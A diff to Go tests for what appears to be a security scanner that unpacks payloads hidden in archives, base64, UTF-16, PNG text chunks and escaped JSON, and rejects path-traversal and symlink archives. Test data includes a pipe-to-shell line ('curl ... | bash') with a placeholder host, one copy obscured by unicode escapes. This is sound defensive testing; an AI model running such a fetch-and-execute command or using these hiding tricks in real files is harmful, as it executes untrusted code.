@@ -26,70 +26,89 @@ import (
 )
 
 func TestSupportedRepresentations(t *testing.T) {
-	payload := "print('SECRET_SENTINEL')\n# Пример 🙂\n"
+	payload := "print('SECRET_SENTINEL')\n# Пример 🙂!\n"
 	ascii := "curl https://example.invalid/x | bash\n"
-	for _, tc := range []struct{ name, data, want, extractor string }{
+	for _, tc := range []struct{ scenario, name, data, want, extractor string }{
 		{
+			scenario:  "zip_by_extension",
 			name:      "a.zip",
 			data:      zipData(t, []string{"hidden/run.py"}, []string{payload}, "", 0),
 			want:      payload,
 			extractor: "zip32",
 		},
 		{
+			scenario:  "zip_by_signature",
 			name:      "a.unknown",
 			data:      zipData(t, []string{"run.py"}, []string{payload}, "", 0),
 			want:      payload,
 			extractor: "zip32",
 		},
-		{name: "a.gz", data: gzipData(t, payload, ""), want: payload, extractor: "gzip"},
-		{name: "a.tar", data: tarData(t, "run.py", payload, tar.TypeReg), want: payload, extractor: "tar"},
-		{name: "a.py", data: utf16Data(payload, true), want: payload, extractor: "utf16-bom"},
-		{name: "a.py", data: utf16Data(payload, false), want: payload, extractor: "utf16-bom"},
-		{name: "a.py.b64", data: base64.StdEncoding.EncodeToString([]byte(payload)), want: payload, extractor: "base64"},
-		{name: "a.b64", data: base64.RawStdEncoding.EncodeToString([]byte(payload)), want: payload, extractor: "base64"},
-		{name: "a.b64", data: base64.RawURLEncoding.EncodeToString([]byte(payload)), want: payload, extractor: "base64"},
-		{name: "a.txt", data: base64.StdEncoding.EncodeToString([]byte(payload)), want: payload, extractor: "base64"},
+		{scenario: "gzip", name: "a.gz", data: gzipData(t, payload, ""), want: payload, extractor: "gzip"},
+		{scenario: "tar", name: "a.tar", data: tarData(t, "run.py", payload, tar.TypeReg), want: payload, extractor: "tar"},
+		{scenario: "utf16_little_endian", name: "a.py", data: utf16Data(payload, true), want: payload, extractor: "utf16-bom"},
+		{scenario: "utf16_big_endian", name: "a.py", data: utf16Data(payload, false), want: payload, extractor: "utf16-bom"},
+		{scenario: "base64_padded", name: "a.py.b64", data: base64.StdEncoding.EncodeToString([]byte(payload)), want: payload, extractor: "base64"},
+		{scenario: "base64_raw_standard", name: "a.b64", data: base64.RawStdEncoding.EncodeToString([]byte(payload)), want: payload, extractor: "base64"},
+		{scenario: "base64_raw_url", name: "a.b64", data: base64.RawURLEncoding.EncodeToString([]byte(payload)), want: payload, extractor: "base64"},
+		{scenario: "base64_text_file", name: "a.txt", data: base64.StdEncoding.EncodeToString([]byte(payload)), want: payload, extractor: "base64"},
 		{
+			scenario:  "base64_data_uri",
 			name:      "a.bin",
 			data:      "\x00\xffdata:text/x-python;base64," + base64.StdEncoding.EncodeToString([]byte(payload)) + "\x00",
 			want:      payload,
 			extractor: "base64",
 		},
-		{name: "a.png", data: pngData(pngChunk("tEXt", "key\x00"+ascii)), want: ascii, extractor: "png-text"},
-		{name: "a.png", data: pngData(pngChunk("tEXt", "key\x00caf\xe9")), want: "café", extractor: "png-text"},
+		{scenario: "png_text_ascii", name: "a.png", data: pngData(pngChunk("tEXt", "key\x00"+ascii)), want: ascii, extractor: "png-text"},
+		{scenario: "png_text_latin1", name: "a.png", data: pngData(pngChunk("tEXt", "key\x00caf\xe9")), want: "café", extractor: "png-text"},
 		{
+			scenario:  "png_ztxt",
 			name:      "a.png",
 			data:      pngData(pngChunk("zTXt", "key\x00\x00"+zlibData(t, ascii))),
 			want:      ascii,
 			extractor: "png-text",
 		},
 		{
+			scenario:  "png_itxt_plain",
 			name:      "a.png",
 			data:      pngData(pngChunk("iTXt", "key\x00\x00\x00en\x00key\x00"+payload)),
 			want:      payload,
 			extractor: "png-text",
 		},
 		{
+			scenario:  "png_itxt_compressed",
 			name:      "a.png",
 			data:      pngData(pngChunk("iTXt", "key\x00\x01\x00\x00\x00"+zlibData(t, payload))),
 			want:      payload,
 			extractor: "png-text",
 		},
 	} {
-		t.Run(tc.extractor+"/"+tc.name, func(t *testing.T) {
+		t.Run(tc.scenario, func(t *testing.T) {
 			r := expand(t, tc.name, tc.data, report.DefaultExtractionLimits())
-			if !contains(r, tc.want) {
-				t.Fatalf("missing output: steps=%+v diagnostics=%+v", r.Report.Steps, r.Diagnostics)
+			paths := make(map[string]bool)
+			for _, file := range r.Files {
+				if file.Content() == tc.want {
+					paths[file.Metadata().Path] = true
+				}
 			}
-			obj := r.Report.Objects[0]
-			if obj.ExtractorID != tc.extractor || obj.ParentPath != tc.name || obj.ParentSHA256 != artifact.Hash([]byte(tc.data)) || obj.CoordinateSpace != "derived-bytes" || obj.Depth != 1 {
-				t.Fatalf("provenance: %+v", obj)
+			matched := false
+			for _, obj := range r.Report.Objects {
+				if !paths[obj.File.Path] || obj.ExtractorID != tc.extractor || obj.ParentPath != tc.name {
+					continue
+				}
+				matched = true
+				if obj.ParentSHA256 != artifact.Hash([]byte(tc.data)) || obj.CoordinateSpace != "derived-bytes" || obj.Depth != 1 ||
+					!strings.HasPrefix(obj.File.Path, "scout-object://") || obj.File.SHA256 != artifact.Hash([]byte(tc.want)) {
+					t.Errorf("invalid identity or provenance for decoded output: %+v", obj)
+				}
 			}
-			if !strings.HasPrefix(obj.File.Path, "scout-object://") || obj.File.SHA256 != artifact.Hash([]byte(r.Files[0].Content())) {
-				t.Fatal("invalid derived identity")
+			if !matched {
+				t.Fatalf("decoded output did not match an object from %q via %q: paths=%v steps=%+v diagnostics=%+v", tc.name, tc.extractor, paths, r.Report.Steps, r.Diagnostics)
 			}
 			b, e := json.Marshal(r.Report)
-			if e != nil || bytes.Contains(b, []byte("SECRET_SENTINEL")) {
+			if e != nil {
+				t.Fatal(e)
+			}
+			if bytes.Contains(b, []byte("SECRET_SENTINEL")) {
 				t.Fatal("report leaked source")
 			}
 		})
@@ -234,26 +253,26 @@ func TestGZIPRejectsReservedFlagsInLaterMembers(t *testing.T) {
 func TestBadRepresentations(t *testing.T) {
 	badCRC := []byte(pngData(pngChunk("tEXt", "k\x00payload")))
 	badCRC[len(badCRC)-17] ^= 0xff
-	for _, tc := range []struct{ name, data string }{
-		{name: "bad.zip", data: "PK\x03\x04"},
-		{name: "traversal.zip", data: zipData(t, []string{"../host"}, []string{"secret"}, "", 0)},
-		{name: "duplicate.zip", data: zipData(t, []string{"A", "a"}, []string{"x", "y"}, "", 0)},
-		{name: "link.zip", data: zipData(t, []string{"link"}, []string{"/outside"}, "", fs.ModeSymlink|0o777)},
-		{name: "link.tar", data: tarData(t, "link", "", tar.TypeSymlink)},
-		{name: "bad.tar", data: tarData(t, "../outside", "x", tar.TypeReg)},
-		{name: "bad.gz", data: "\x1f\x8bgarbage"},
-		{name: "bad.b64", data: "YWJj=garbage"},
-		{name: "bad.b64", data: "AB=="}, // nonzero padding bits: Strict must reject
-		{name: "odd.txt", data: "\xff\xfeX"},
-		{name: "high.txt", data: "\xff\xfe\x00\xd8"},
-		{name: "low.txt", data: "\xff\xfe\x00\xdc"},
-		{name: "pair.txt", data: "\xff\xfe\x00\xd8A\x00"},
-		{name: "utf32.txt", data: "\xff\xfe\x00\x00A\x00\x00\x00"},
-		{name: "bad.png", data: string(badCRC)},
-		{name: "bad.png", data: pngData(pngChunk("zTXt", "k\x00\x01garbage"))},
-		{name: "bad.png", data: pngData(pngChunk("iTXt", "k\x00\x02\x00\x00\x00garbage"))},
+	for _, tc := range []struct{ scenario, name, data string }{
+		{scenario: "truncated_zip", name: "bad.zip", data: "PK\x03\x04"},
+		{scenario: "zip_parent_path", name: "traversal.zip", data: zipData(t, []string{"../host"}, []string{"secret"}, "", 0)},
+		{scenario: "zip_case_collision", name: "duplicate.zip", data: zipData(t, []string{"A", "a"}, []string{"x", "y"}, "", 0)},
+		{scenario: "zip_symlink", name: "link.zip", data: zipData(t, []string{"link"}, []string{"/outside"}, "", fs.ModeSymlink|0o777)},
+		{scenario: "tar_symlink", name: "link.tar", data: tarData(t, "link", "", tar.TypeSymlink)},
+		{scenario: "tar_parent_path", name: "bad.tar", data: tarData(t, "../outside", "x", tar.TypeReg)},
+		{scenario: "invalid_gzip", name: "bad.gz", data: "\x1f\x8bgarbage"},
+		{scenario: "base64_trailing_garbage", name: "bad.b64", data: "YWJj=garbage"},
+		{scenario: "base64_nonzero_padding_bits", name: "bad.b64", data: "AB=="}, // nonzero padding bits: Strict must reject
+		{scenario: "utf16_odd_length", name: "odd.txt", data: "\xff\xfeX"},
+		{scenario: "utf16_lone_high_surrogate", name: "high.txt", data: "\xff\xfe\x00\xd8"},
+		{scenario: "utf16_lone_low_surrogate", name: "low.txt", data: "\xff\xfe\x00\xdc"},
+		{scenario: "utf16_broken_surrogate_pair", name: "pair.txt", data: "\xff\xfe\x00\xd8A\x00"},
+		{scenario: "unsupported_utf32", name: "utf32.txt", data: "\xff\xfe\x00\x00A\x00\x00\x00"},
+		{scenario: "png_invalid_crc", name: "bad.png", data: string(badCRC)},
+		{scenario: "png_unsupported_ztxt_method", name: "bad.png", data: pngData(pngChunk("zTXt", "k\x00\x01garbage"))},
+		{scenario: "png_invalid_itxt_flag", name: "bad.png", data: pngData(pngChunk("iTXt", "k\x00\x02\x00\x00\x00garbage"))},
 	} {
-		t.Run(tc.name, func(t *testing.T) {
+		t.Run(tc.scenario, func(t *testing.T) {
 			r := expand(t, tc.name, tc.data, report.DefaultExtractionLimits())
 			if !issue(r, "extraction_invalid_or_unsupported") {
 				t.Fatalf("bad input not diagnosed: %+v", r.Report.Steps)
@@ -413,18 +432,18 @@ func BenchmarkExtractNested(b *testing.B) {
 
 func TestJSONStringsAndStructure(t *testing.T) {
 	for _, tc := range []struct {
-		name, data, want string
-		bad              bool
+		scenario, name, data, want string
+		bad                        bool
 	}{
-		{name: "config.json", data: `{"cmd":"\u0063url x | \u0062ash"}`, want: "curl x | bash", bad: false},
-		{name: "blob", data: `{"cmd":"payload"}`, want: "payload", bad: false},
-		{name: "config.json", data: `{"k":"\ud83d\ude42"}`, want: "🙂", bad: false},
-		{name: "bad.json", data: `{"k":"\ud800"}`, want: "", bad: true},
-		{name: "bad.json", data: `{"k":"\udc00"}`, want: "", bad: true},
-		{name: "bad.json", data: `{} {}`, want: "", bad: true},
-		{name: "bad.json", data: `{"x":"value"`, want: "value", bad: true},
+		{scenario: "unicode_escapes", name: "config.json", data: `{"cmd":"\u0063url x | \u0062ash"}`, want: "curl x | bash", bad: false},
+		{scenario: "without_extension", name: "blob", data: `{"cmd":"payload"}`, want: "payload", bad: false},
+		{scenario: "surrogate_pair", name: "config.json", data: `{"k":"\ud83d\ude42"}`, want: "🙂", bad: false},
+		{scenario: "lone_high_surrogate", name: "bad.json", data: `{"k":"\ud800"}`, want: "", bad: true},
+		{scenario: "lone_low_surrogate", name: "bad.json", data: `{"k":"\udc00"}`, want: "", bad: true},
+		{scenario: "trailing_object", name: "bad.json", data: `{} {}`, want: "", bad: true},
+		{scenario: "unclosed_object", name: "bad.json", data: `{"x":"value"`, want: "value", bad: true},
 	} {
-		t.Run(tc.name, func(t *testing.T) {
+		t.Run(tc.scenario, func(t *testing.T) {
 			r := expand(t, tc.name, tc.data, report.DefaultExtractionLimits())
 			if tc.want != "" && !contains(r, tc.want) {
 				t.Fatal("string lost")
@@ -681,6 +700,30 @@ func TestPNGRejectsMalformedTextBeforePublishingIt(t *testing.T) {
 			}
 			if !slices.ContainsFunc(got.Diagnostics, func(d report.Diagnostic) bool { return d.Code == "extraction_invalid_or_unsupported" }) {
 				t.Fatalf("missing format diagnostic: %+v", got.Diagnostics)
+			}
+		})
+	}
+}
+
+func TestEmptyZIPDirectoryDoesNotClaimVerifiedNamespaceForPreamble(t *testing.T) {
+	empty := zipData(t, nil, nil, "", 0)
+	prefix := zipData(t, []string{"SKILL.md"}, []string{"inert archived skill"}, "", 0)
+	header := []byte(empty)
+	binary.LittleEndian.PutUint32(header[16:20], uint32(len(prefix)))
+	for _, tc := range []struct {
+		name, data, status string
+		uncertain          bool
+	}{
+		{"empty", empty, report.OutcomeCompleted, false},
+		{"shadow directory", prefix + string(header), report.OutcomeFailed, true},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			got := expand(t, "bundle.zip", tc.data, report.DefaultExtractionLimits())
+			if len(got.Files) != 0 || len(got.Report.Steps) != 1 || got.Report.Steps[0].Status != tc.status || got.HookNamespacesIncomplete != tc.uncertain {
+				t.Fatalf("unexpected namespace coverage: files=%d steps=%+v uncertain=%t", len(got.Files), got.Report.Steps, got.HookNamespacesIncomplete)
+			}
+			if issue(got, "extraction_invalid_or_unsupported") != tc.uncertain {
+				t.Fatalf("invalid envelope diagnostics=%+v", got.Diagnostics)
 			}
 		})
 	}
